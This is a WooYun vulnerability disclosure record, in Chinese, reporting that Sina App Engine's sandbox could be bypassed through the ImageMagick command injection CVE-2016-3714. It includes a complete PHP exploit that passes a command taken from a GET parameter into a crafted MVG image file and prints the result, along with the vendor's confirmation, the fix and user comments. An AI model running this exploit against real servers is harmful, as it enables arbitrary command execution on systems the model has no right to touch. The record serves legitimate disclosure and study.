{"id": 87986, "wybug_id": "wooyun-2016-0205051", "wybug_title": "SAE 沙盒绕过（ImageMagick CVE20163714 应用实例）                                      ", "wybug_corp": "新浪", "wybug_author": "Ricter", "wybug_date": "2016-05-04 19:48", "wybug_open_date": "2016-06-22 17:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-22：\t细节向公众公开  简要描述： SAE 有 ImageMagick，可以利用 CVE-2016-3714 进行沙盒绕过执行任意命令。 详细说明：  漏洞细节：http://pastebin.com/aE4sKnCgImageMagick 的命令注入，当然也影响 PHP 的 ImageMagick 库。  Exploit：\n<?phpecho \"Disable Functions: \" . ini_get('disable_functions') . \"\\n\";$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];if ($command == '') {    $command = 'id';}$command = $command . \">\" . SAE_TMP_PATH . \"/data\";$exploit = <<<EOFpush graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg\"|$command\")'pop graphic-contextEOF;$path1 = SAE_TMP_PATH . \"KKKK.mvg\";$path2 = SAE_TMP_PATH . \"KKKK.png\";file_put_contents($path1, $exploit);$thumb = new Imagick();$thumb->readImage($path1);$thumb->writeImage($path2);$thumb->clear();$thumb->destroy();unlink(\"$path1\");unlink(\"$path2\");echo file_get_contents(SAE_TMP_PATH . \"/data\");?>\n很慢，要等一会儿..   漏洞证明：  \n\n\n\n\n\n   修复方案：  编译安装新版本 ImageMagick。   版权声明：转载请注明来源 Ricter@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-05-08 17:00 厂商回复： 感谢关注新浪安全，问题修复中。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-04 19:51 |    \t\tRicter \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:20        | 渣渣一个)\t\t \n  PS：我把那个 2.php 给去掉了，省的有人乱搞..    \n     2016-05-04 19:55 |    \t\tzFox49 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 我是一只狗(´ ・ω・｀))\t\t \n  RR哥哥好厉害！窝竟然有幸见证。又学习了一个，人生经验。从看到新闻到制造新闻，Nice！ ╮(๑╹◡╹๑)╭    \n     2016-05-04 19:57 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:415 漏洞数:99        | 哇啦啦啦啦啦 我的宝贝  |  Tr3jer@Gmail.c...)\t\t \n  菊苣    \n     2016-05-04 20:05 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:23        | 膜拜学习中)\t\t \n  牛逼    \n     2016-05-04 20:15 |    \t\tboooooom  \t\t\t( 普通白帽子  |\t\t\t        Rank:486 漏洞数:53        | 我有一个好想法！)\t\t \n  牛逼，感觉不是很科学的样子啊。    \n     2016-05-04 21:30 |    \t\terevus \t\t\t( 普通白帽子  |\t\t\t        Rank:201 漏洞数:33        )\t\t \n  膜拜菊苣    \n     2016-05-05 04:53 |    \t\t机器猫 \t\t\t( 普通白帽子  |\t\t\t        Rank:1358 漏洞数:291        | 爱生活、爱腾讯、爱网络！一个有梦想的16岁...)\t\t \n  牛逼    \n     2016-05-06 11:32 |    \t\tIs0Man \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | you still have lots more to work on)\t\t \n  牛逼，MARK一下    \n     2016-05-06 12:03 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1694 漏洞数:237        | 。)\t\t \n  膜拜菊苣    \n     2016-05-07 15:36 |    \t\t橘子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | 呢个...羞射高中生一枚。带上大神@Haswell...)\t\t \n  膜拜菊苣    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}